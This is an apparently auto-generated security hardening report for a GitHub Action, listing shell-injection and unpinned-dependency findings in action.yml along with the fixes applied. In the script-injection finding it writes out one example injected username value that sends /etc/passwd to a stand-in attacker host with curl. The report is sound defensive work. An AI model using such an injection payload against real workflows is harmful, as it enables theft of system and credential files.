<!-- markdownlint-disable -->

# Hardening Report: czl9707--gh-space-shooter/v1.0.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **czl9707--gh-space-shooter/v1.0.3** was hardened automatically. 8 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The action uses `actions/setup-python@v5`, which is pinned to a mutable tag (`@v5`) rather than an immutable 40-character commit SHA. This means the referenced action could be silently changed to a malicious version without any change to this file, enabling a supply-chain attack.

Locations:

- `action.yml:43`

### script-injection (severity: high)

Sub-rule (a): Multiple `${{ inputs.* }}` expressions are directly interpolated inside `run:` shell command strings without routing through env vars or sanitization. In the 'Generate game GIF' step, `${{ inputs.username }}`, `${{ inputs.output-path }}`, `${{ inputs.strategy }}`, and `${{ inputs.fps }}` are all interpolated directly into the shell command. In the 'Commit and push GIF' step, `${{ inputs.output-path }}` and `${{ inputs.commit-message }}` are interpolated directly. An attacker who controls these inputs (e.g. via `workflow_dispatch` or a calling workflow) can inject arbitrary shell commands. For example, a `username` value of `foo; curl -d @/etc/passwd https://evil.com` would execute as a shell command.

Locations:

- `action.yml:52`
- `action.yml:53`
- `action.yml:54`
- `action.yml:55`
- `action.yml:61`
- `action.yml:62`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.username }}" appears directly in run: block of step "Generate game GIF"; move to env: map

Locations:

- `action.yml:59`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.output-path }}" appears directly in run: block of step "Generate game GIF"; move to env: map

Locations:

- `action.yml:60`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.strategy }}" appears directly in run: block of step "Generate game GIF"; move to env: map

Locations:

- `action.yml:61`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.fps }}" appears directly in run: block of step "Generate game GIF"; move to env: map

Locations:

- `action.yml:62`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.output-path }}" appears directly in run: block of step "Commit and push GIF"; move to env: map

Locations:

- `action.yml:69`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.commit-message }}" appears directly in run: block of step "Commit and push GIF"; move to env: map

Locations:

- `action.yml:70`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed all 8 findings in hardened/action/action.yml:
1. Pinned actions/setup-python@v5 to full SHA a26af69be951a213d495a4c3e4e4022e16d87065 (kept # v5 comment for readability).
2. Moved all ${{ inputs.* }} expressions from run: shell strings into env: blocks for both the 'Generate game GIF' step (inputs.username, inputs.output-path, inputs.strategy, inputs.fps) and the 'Commit and push GIF' step (inputs.output-path, inputs.commit-message). All env vars are referenced with double-quotes in the shell scripts to prevent word splitting while eliminating injection risk.

